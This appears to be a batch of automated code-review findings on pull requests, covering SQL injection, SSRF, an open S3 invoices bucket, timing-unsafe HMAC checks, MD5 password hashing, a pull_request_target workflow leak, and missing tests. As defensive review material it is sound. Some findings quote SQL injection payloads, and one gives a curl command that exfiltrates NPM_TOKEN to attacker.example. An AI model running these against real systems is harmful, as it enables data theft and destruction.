findings.body: The diff removes the per-report require_owner call, which enforced tenant isolation on bulk_export. No test changes accompany this diff. If there is an existing test for bulk_export, it likely only checks that reports the user owns are returned, not that reports belonging to another tenant are excluded/rejected — such a test would still pass after this change even though it now leaks other tenants' data. A test that calls bulk_export with report_ids spanning multiple tenants and asserts a Forbidden (or filtered result) is needed to catch this regression.

findings.title: search_customers interpolates values instead of passing params to execute()
findings.body:
`execute(sql, params=None)` is documented as "Run a parameterised query. `params` must carry every caller value." `search_customers` ignores that: it splices `term` and `status` into the SQL text with an f-string and then calls `execute(sql)` with no params at all, unlike the sibling `get_customer` on line 5 which correctly uses `%s` with a tuple.

Beyond the obvious injection exposure, this is plainly incorrect for reachable inputs: a support agent searching for `O'Brien` closes the string literal and the query raises a syntax error; a `None` for `status` renders the literal string `'None'` and silently matches nothing; and any `%` or `_` the user types in `term` is treated as a LIKE wildcard rather than a literal character.

Fix by keeping the wildcards in the parameter value, not the SQL:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

findings.title: SQL injection: search terms interpolated into query string
findings.body:
`search_customers` composes its SQL with an f-string, placing `term` and `status` inside single quotes with no escaping or parameterisation, then calls `execute(sql)` with no params. Anyone who can reach the described name/status search (per the PR description, support staff via a lookup endpoint — and any request path that feeds it) controls the contents of both values. A value such as `' OR '1'='1` returns the whole customers table; `'; DROP TABLE customers; --` or a stacked/UNION payload reaches the driver verbatim, so the attacker gets arbitrary read of billing data and, depending on driver settings, arbitrary writes.

Fix by passing values as parameters, e.g.:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

The wildcards belong in the bound value, not in the SQL text. Note `billing/db.py` documents that `params` "must carry every caller value", and `get_customer` on line 5 already follows that contract.

findings.title: No test exists for search_customers behaviour
findings.body: search_customers builds SQL via f-string interpolation of term and status and calls execute(sql) with no params argument. There is no test in this diff verifying that the function returns expected rows for a given term/status, or that it correctly composes the query. If the interpolation logic were wrong (e.g. wrong operator, wrong field, broken escaping) nothing would catch it — the function is entirely untested.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS destination check
findings.body:
The existing send path validates the destination against `ALLOWED_HOSTS` and raises `ValueError("destination not allowed")` before issuing the request. `verify_endpoint` performs a request to a caller-supplied `url` with no equivalent check, so a tenant registering a webhook target can drive an outbound GET from the server to any host — internal services, cloud metadata endpoints, or localhost — and read back the status code as an oracle. Extract the host parsing and allowlist check used on lines 8–9 into a shared helper and call it from `verify_endpoint` before the request. Note also that `requests` follows redirects by default, so an allowed host can redirect into an internal target; pass `allow_redirects=False` (or re-validate each hop) on both call sites.

_Also raised by the security agent:_ verify_endpoint skips the ALLOWED_HOSTS check — SSRF

findings.title: New verify_endpoint has no test and skips host validation used elsewhere
findings.body: verify_endpoint performs a GET to an arbitrary URL without the ALLOWED_HOSTS check applied a few lines above for the POST path. There is no test in this diff exercising verify_endpoint, so if this function were changed to leak data, hang, or fail silently, nothing would catch it. At minimum, a test confirming behavior on both allowed and disallowed hosts (or documenting that this function intentionally has no such restriction) is needed.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A function named `verify_endpoint` that returns a status code will, for the most likely failure modes of an unverified customer URL (DNS failure, refused connection, TLS error, or the 5s timeout expiring), raise `requests.exceptions.RequestException` rather than returning anything. Any caller written against the `-> int` shape will propagate an exception out of what reads as a boolean-ish check. Catch `requests.RequestException` and return a sentinel (or `None`), or document that the function raises and make callers handle it.

findings.title: verify_endpoint name implies validation it doesn't perform
findings.body: The function is named verify_endpoint, which reads as 'confirm this endpoint is safe/reachable' and would naturally be used as a boolean guard (e.g. `if verify_endpoint(url): ...`). Instead it returns the raw HTTP status code and does not check the destination against ALLOWED_HOSTS the way the sibling function above it does. Since any non-zero status code (404, 500, etc.) is truthy in Python, a caller relying on the name would get a false sense of validation. Either rename it to something like get_endpoint_status, or document that it returns a raw status code and performs no allowlist check.

findings.title: PR adds a public customer-invoices bucket, not the described assets bucket
findings.body:
The change description says "Public assets bucket for the marketing site, next to the existing private one", but the only new resources are `aws_s3_bucket.invoices` (`acme-customer-invoices`) and an `aws_s3_bucket_public_access_block.invoices` with all four guards set to `false`. The pre-existing `assets` bucket is untouched apart from whitespace realignment on line 6.

With `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all `false`, nothing at the account/bucket level prevents a public ACL or bucket policy from being applied to customer invoice data — a single later ACL grant or policy would expose it, with no backstop.

If a public marketing-assets bucket is what is wanted, create that bucket and leave the invoices bucket's public access block at the restrictive defaults (`true` for all four). If the invoices bucket genuinely needs to be reachable from the internet, that needs to be stated explicitly and reviewed on its own, not landed under an "assets bucket" description.

findings.title: Customer invoices bucket created with all public-access blocks disabled
findings.body:
`aws_s3_bucket.invoices` ("acme-customer-invoices") is paired with an `aws_s3_bucket_public_access_block` that sets all four guards to `false`. This switches off the account/bucket-level control that otherwise prevents a public ACL or bucket policy from ever taking effect on this bucket, on a bucket whose name says it holds customer billing documents.

Adversary: any unauthenticated internet user, or any principal (including a compromised CI role or a mistaken later commit) able to attach an ACL/policy to the bucket. What they control: nothing is required to read the objects once any public grant exists; the block was the only thing that would have neutralised such a grant. What they get: customer invoices — names, addresses, amounts, and often tax identifiers.

Fix: for the invoices bucket set `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `true` (the AWS default), and grant access via IAM/presigned URLs instead. The permissive block belongs only on the marketing assets bucket, if anywhere.

Separately, this resource is out of scope for a PR described as adding the public marketing assets bucket; a sensitive-data bucket with guardrails off should not ride along with a formatting-only change to the assets block.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same HMAC digest as `verify_stripe` but returns `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the signature an attacker guessed correctly; a remote caller can recover a valid signature byte-by-byte and forge webhooks without knowing the secret. Use the same constant-time primitive the adjacent function already uses: `return hmac.compare_digest(expected, header)`.

Secondary note: `compare_digest` also raises on mismatched str/bytes types rather than silently returning False, so switching keeps the two providers behaving identically when `header` arrives as bytes.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: No test distinguishes verify_acmepay's timing-unsafe compare from verify_stripe
findings.body: verify_acmepay is a new security-relevant function (webhook signature verification) added with no accompanying test. Nothing in this diff would catch a regression such as verify_acmepay accepting an incorrect signature, returning the wrong type, or diverging in behavior from verify_stripe (e.g. the use of `==` instead of `hmac.compare_digest`). A test asserting correct/incorrect signatures are accepted/rejected for verify_acmepay is needed.

findings.title: Full traceback and exception text returned to HTTP clients
findings.body:
`handle()` now serialises `str(exc)` and `traceback.format_exc()` into the 500 response body. Any unauthenticated caller who can provoke an unhandled exception (malformed parameter, oversized payload, unexpected content type) receives the server's stack frames: absolute filesystem paths, module and package layout, source lines, and third-party library versions. Exception strings are frequently worse than the stack itself — DB driver errors embed the failing SQL and sometimes the DSN including credentials, HTTP client errors embed internal service URLs and tokens in query strings, and `KeyError`/`ValueError` messages often carry fragments of the request or configuration.

This is reconnaissance material that turns blind probing into targeted attacks, and in the DSN case it can leak a secret outright.

Keep the client-facing body generic and route the detail to the log, which `log.exception("request failed")` on line 8 already captures. If on-call needs correlation without SSH, emit a random request/error id, log it alongside the traceback, and return only that id:

    err_id = uuid.uuid4().hex
    log.exception("request failed", extra={"error_id": err_id})
    return {"error": "internal error", "error_id": err_id}, 500

If verbose output is genuinely wanted for local work, gate it behind an explicit debug flag that is off by default in production config.

Separately: `traceback.format_exc()` reads the *currently handled* exception, not `exc`. If `handle()` is ever called outside an `except` block (or from a different frame after the handler returns) it yields `"NoneType: None"` rather than the trace for `exc`; `traceback.format_exception(exc)` is the accurate form.

_Also raised by the correctness agent:_ format_exc() ignores `exc` and reads ambient exception state

_Also raised by the correctness agent:_ `error` field is no longer a stable string and may be empty

findings.title: No test verifies error response now includes traceback/exception text
findings.body: The behavior of handle() changed from returning a generic error message to including str(exc) and a full traceback in the response body. No test is included in this diff to assert the new response shape (keys 'error' and 'traceback', status 500). If this were reverted or altered incorrectly (e.g., wrong key name, missing traceback field, or exception formatting error), nothing would fail.

findings.title: Reset path hashes passwords with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` returns `hashlib.md5(raw.encode()).hexdigest()` — an unsalted, GPU-fast digest — for what the name and the module both indicate is a user password. Any password set through the reset flow is stored in a form that is recoverable at billions of guesses per second, and identical passwords produce identical digests, so a single rainbow-table lookup or offline crack yields plaintext credentials that are very likely reused on other services.

The adversary is anyone who obtains the credential store (SQL injection elsewhere, a leaked backup, an insider, a compromised replica). They control no input at all — they only need read access to the hash column — and what they get is plaintext passwords and account takeover, including for accounts that never used the reset path if the digest column is shared.

The fix is to call the existing primitive: `return hash_password(raw)`, i.e. `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`. There is no reason for the reset path to use a different algorithm than the signup path — if verification currently branches on which helper produced the stored value, that branch should be removed too, and existing MD5 rows should be forced to re-hash on next login.

findings.title: hash_reset_password output is incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`) that must be verified with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char hex digest. If the reset flow stores its value in the same column/field as `hash_password` — which the co-location in this module strongly suggests — verification will either return False for every correct password or raise `ValueError: invalid salt` from `bcrypt.checkpw`, depending on the verifier. Two hashing functions with the same evident role must produce mutually verifiable output: make the reset path use `bcrypt.hashpw` like `hash_password`, or introduce an explicit verify function that routes by format. (The choice of an unsalted MD5 digest for a credential is separately a serious weakness.)

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password is a new, security-sensitive function (used for password reset tokens/hashes) but no test exists to verify its behavior. If the hashing scheme were changed or broken, nothing would catch it. Since no test file is included in this diff and no existing test suite was retrieved for this module, this is flagged as a coverage gap rather than a certainty, but given the sensitivity of password-reset hashing it warrants at least a basic test asserting expected output shape/determinism.

findings.title: checksum() reads the entire file into memory at once
findings.body: `fh.read()` materialises the whole file before hashing, so memory use scales with file size and a large or attacker-influenced path can exhaust memory. Hash it in chunks instead, e.g. loop over `fh.read(65536)` (or `hashlib.file_digest(fh, 'sha256')` on 3.11+) and feed each block to `update()`.

findings.title: pull_request_target runs forked PR code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets` and a `GITHUB_TOKEN` with write scope, unlike `pull_request` from a fork. Line 12 then explicitly checks out `github.event.pull_request.head.sha` — the attacker's commit — and line 13 executes `./scripts/measure.sh` from that checkout, with `NPM_TOKEN` injected into its environment (lines 14-15).

Attacker: anyone who can open a pull request from a fork (no prior access needed, no maintainer approval required — `pull_request_target` jobs run automatically for first-time contributors too). What they control: the entire contents of the checked-out tree, including `scripts/measure.sh` itself and anything it sources or invokes (package.json scripts, Makefiles, lockfile-driven installs). What they get: arbitrary command execution in the base-repo job with `NPM_TOKEN` and the job's `GITHUB_TOKEN` readable from the process environment and exfiltratable in one line (`curl -d "$NPM_TOKEN" attacker.example`). That is publish access to the npm package plus, depending on default token permissions, write access to this repository.

To give forked PRs the same signal safely, either keep `on: pull_request` (which runs untrusted code but with no secrets and a read-only token), or split into two workflows: a `pull_request` job that builds the untrusted tree and uploads the measurement as an artifact, and a `workflow_run` job that has the secret and only reads that artifact. If `pull_request_target` must be kept, do not check out the head SHA and do not pass secrets to any step that executes code from the PR.

_Also raised by the correctness agent:_ pull_request_target checks out fork code and runs it with NPM_TOKEN

findings.title: Non-JSON-serialisable context values now raise TypeError
findings.body: The old key only required context values to be hashable: `tuple(sorted(context.items()))` happily accepted `datetime`, `Decimal`, `UUID`, enums, or any custom object with `__hash__`. `json.dumps` accepts only dict/list/str/int/float/bool/None, so any existing caller passing such a value now gets `TypeError: Object of type X is not JSON serializable` from `cached_render` itself — a function that previously rendered successfully. If the intent is only to normalise the key, use a serialiser that cannot fail on arbitrary values (e.g. `json.dumps(..., default=repr)`) or keep the structural tuple key and hash its `repr`.

findings.title: No test asserts the actual argv list passed to subprocess.run
findings.body: The whole point of this change is to pass tar's arguments as a list (avoiding shell interpolation) rather than just setting shell=False. test_runs_without_a_shell only asserts spy.last_call.kwargs["shell"] is False; it never inspects spy.last_call.args (or equivalent) to confirm the command is the expected list ['tar', '-czf', '/exports/nightly.tar.gz', '--', '/srv/data']. A future edit that reintroduces string interpolation while still passing shell=False (or that drops the '--' separator, breaks argument order, or mishandles the directory argument) would not be caught by this test.

findings.title: `directory` reaches tar unvalidated while `name` is allowlisted
findings.body:
`name` is now constrained by `SAFE_NAME.fullmatch`, but the second operand `directory` is passed straight through to `tar` as a path operand. The `--` terminator does correctly prevent option injection (a value like `--use-compress-program=...` is treated as a path), so command execution is not reachable. What remains is that whoever supplies `directory` chooses which part of the filesystem gets packed into `/exports/<name>.tar.gz` — e.g. `/etc` or `/root` — and the resulting archive sits at a predictable, likely-servable path. If `directory` originates from a request parameter, that is an arbitrary-file-read primitive for any caller who can also fetch the archive.

Suggested fix: resolve `directory` (`os.path.realpath`) and assert it is contained within an expected export root before invoking `tar`, mirroring the treatment `name` already gets.

findings.title: New name allowlist rejects names existing callers likely pass
findings.body: `create_archive` previously accepted any `name` and interpolated it into the command. It now raises `ValueError` for anything that isn't `[A-Za-z0-9_-]{1,64}` — which excludes dots, spaces, colons and slashes. Timestamped or namespaced archive names such as `backup.2024-01-01`, `tenant/nightly`, or ISO timestamps containing `:` were valid before and now raise at call time, turning a previously-working archive job into a hard failure. Either widen the allowlist to the characters legitimately used (e.g. add `.` and cap the total length after joining), or audit every caller and confirm none of them produce such names before merging. Note the 64-character cap is also new and unbounded-length names were fine before.

findings.title: `spy` fixture is not defined in this change
findings.body: `test_runs_without_a_shell` requests a `spy` fixture, which is not a built-in pytest fixture and is not defined in either file in this PR. If no `conftest.py` already provides it, the test errors at collection with "fixture 'spy' not found"; worse, if it exists but does not patch `subprocess.run`, the test actually shells out to `tar` and writes to `/exports`. Add the fixture (e.g. a `monkeypatch.setattr` on `export.archive.subprocess.run` recording calls) or switch to `unittest.mock.patch` so the test is self-contained.

findings.title: `directory` is no longer word-split or glob-expanded
findings.body: Under `shell=True` the old command string let `directory` expand: `"/srv/a /srv/b"` became two operands and `"/srv/data/*"` was globbed by the shell. As a single argv element after `--`, the same value is now handed to tar as one literal path and tar fails with "Cannot stat: No such file or directory" plus a non-zero exit, which `check=True` converts to `CalledProcessError`. If any caller passes multiple paths or a glob in one string, this is a silent-until-runtime break; consider accepting a list of directories and splatting it into the argv.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
test_renders_empty_invoice calls render(Invoice(lines=[])) but never asserts anything about the result. This test will pass regardless of what render() returns (including raising nothing, returning None, or producing garbage output), so it provides no real coverage of the blank-invoice case despite its name.

_Also raised by the correctness agent:_ test_renders_empty_invoice asserts nothing

findings.title: Test only checks mock call_count, not rendered output
findings.body:
test_renders_line_items patches format_line and only asserts fmt.call_count == 2. This verifies the mock was invoked twice but never checks that render() actually incorporates the formatted line items into its output. If render() dropped the formatted results or concatenated them incorrectly, this test would still pass.

_Also raised by the correctness agent:_ Line-item test asserts only on the mock, not on rendered output

findings.title: Exact-half boundary test deleted instead of updated to new behaviour
findings.body:
`test_rounds_half_to_even` was the only test pinning behaviour at the exact-half boundary (`Decimal("2.345")`). It has been deleted rather than rewritten to assert the new intended result, so after this change nothing verifies how `round_cents` handles a tie — the single case where the rounding fix actually changes behaviour. The remaining `test_rounds_up_above_half` only covers values strictly above the half. Please replace the deleted test with one asserting the new expected tie behaviour (e.g. `round_cents(Decimal("2.345")) == Decimal("2.35")`) instead of dropping coverage.

_Also raised by the tests agent:_ Deleted rounding test not replaced with updated assertion

findings.title: PR claims a rounding fix but contains no implementation change
findings.body: The PR description says "Fix the rounding and drop the failing test", yet the only changed file is `tests/test_rounding.py` and the only change is a deletion. If the implementation of `round_cents` was not changed in this PR, then the failing assertion was removed to make CI green while the underlying rounding behaviour is unchanged. Either include the production fix in this change or explain where it landed; a test deletion alone converts a known failure into silent wrong behaviour.

findings.title: Mock patches wrong target; real deliver() is still called
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so the name `deliver` is bound in the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only — `send_with_retry` keeps calling the original function. The test therefore invokes the real transport up to three times (possible network I/O, slowness, flakiness) and only passes incidentally if the real `deliver` happens to return falsy; it will silently stop testing the give-up path if the real implementation ever succeeds. Patch `notify.sender.deliver` instead, matching the existing test on line 2, and assert the call count is 3 so the retry behaviour is actually verified.

_Also raised by the tests agent:_ Patch target does not affect send_with_retry's bound reference

findings.title: csv_rows never escapes values, producing malformed CSV
findings.body: `csv_rows` joins stringified cell values with `,` directly, so any value containing a comma, a double quote, or a newline shifts or corrupts every subsequent column on that line. The `csv_escape` helper added in the same change is exactly the fix but is never called. Route each cell through it: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note also that `csv_escape` only checks for `,` and `"` — a value containing `\n` or `\r` also needs quoting per RFC 4180, and it will raise `TypeError` if handed a non-str, which is why the `str(...)` must stay on the caller side.

findings.title: New exporter functions ship with no tests
findings.body: csv_rows and csv_escape (reports/csv_export.py), dump_streaming and dump_pretty (reports/json_export.py), and margins_for and usable_width (reports/pdf_export.py) are all new public functions with non-trivial logic (CSV quoting rules, chunk boundary arithmetic, margin/width calculations) but no tests are added. The repository already has a precedent of testing exporter helpers (test_csv_header_matches_columns for csv_header), so this is a gap relative to the existing standard, not just an absent ideal. A bug in comma/quote escaping, an off-by-one in chunk_size slicing, or a wrong margin formula would currently pass silently.

findings.title: csv_rows joins values unescaped, bypassing csv_escape
findings.body:
`csv_rows` renders each field with `str(r.get(c, ""))` and joins on `,` without routing the value through `csv_escape`, which is added directly below it in the same commit. Any field value that contains a comma, a double quote, or a newline will change the column/row structure of the generated file: a value like `Smith, Bob` becomes two columns, and a value containing `\n` becomes an extra record that downstream parsers will read as real data. Where the export feeds another system (billing reconciliation, re-import, audit log ingestion), that is row forgery by whoever can set the field.

Fix: apply `csv_escape(str(r.get(c, "")))` inside the comprehension, and extend `csv_escape` to also quote values containing `\n` or `\r` (line 12 currently checks only `,` and `"`). The standard-library `csv` module handles all of these cases and would be safer than the hand-rolled pair.

Separately, while you are touching this path, consider prefix-neutralising values that begin with `=`, `+`, `-` or `@`, which spreadsheet applications evaluate as formulas when the exported file is opened.

findings.title: dump_streaming requires a sized, sliceable sequence
findings.body: Despite the name, `dump_streaming` calls `len(rows)` and slices `rows[i : i + chunk_size]`, so it raises `TypeError` for any generator or other lazy iterable — the very input a streaming API invites. Either document that `rows` must be a list, or chunk with `itertools.islice` over an iterator. Separately, `chunk_size=0` (or negative) reaches `range(0, n, 0)` and raises `ValueError: range() arg 3 must not be zero`; a guard or a documented precondition would be cheap.

findings.title: Time-dependent test uses real clock instead of fixed/mocked time
findings.body:
Unlike test_token_expires_after_an_hour, which passes an explicit `now` to control the comparison, test_token_issued_today_is_valid calls issue_token() and is_expired(token.expires_at) using the real system clock (no `now=` argument), and compares token.issued_at.date() to datetime.now(timezone.utc).date(). This makes the test flaky: if issue_token() and datetime.now() are called on either side of midnight UTC, the date() comparison fails spuriously, and the test's outcome depends on the real-world time at CI run rather than on a fixed scenario. It also does not test any specific point near the expiry boundary — it only confirms a token issued 'now' is not immediately expired, which passes for almost any reasonable implementation and wouldn't catch an off-by-one error in the expiry window logic.

_Also raised by the correctness agent:_ Date comparison against now() is flaky across UTC midnight

findings.title: No test covers CouponExpired rejection path
findings.body:
The PR adds logic to raise CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, exercising just the non-expired branch. If the comparison were inverted, the exception were never raised, or the wrong field compared, nothing in the test suite would fail. Add a test that passes an already-expired coupon and asserts CouponExpired is raised.

_Also raised by the correctness agent:_ New CouponExpired branch has no test

findings.title: apply_coupon breaks for coupons with missing or naive expires_at
findings.body:
`coupon.expires_at < datetime.now(timezone.utc)` assumes every coupon passed in has an `expires_at` that is a timezone-aware datetime. Two reachable inputs break with a raw `TypeError`/`AttributeError` rather than a domain error:

- a coupon with no expiry (`expires_at` is `None`, or the attribute is absent) — the same test file previously constructed `Coupon(amount=10)` with no `expires_at` at all and had to be amended in this diff, which is direct evidence that coupons without the field exist in the codebase;
- a coupon whose `expires_at` is naive (no tzinfo) — comparing naive to aware raises `TypeError: can't compare offset-naive and offset-aware datetimes`.

Guard explicitly, e.g. `if coupon.expires_at is not None and coupon.expires_at < now:`, and normalise naive values to UTC before comparing. If `expires_at` is genuinely mandatory and always aware, that needs to be enforced at the `Coupon` construction site, not assumed here.
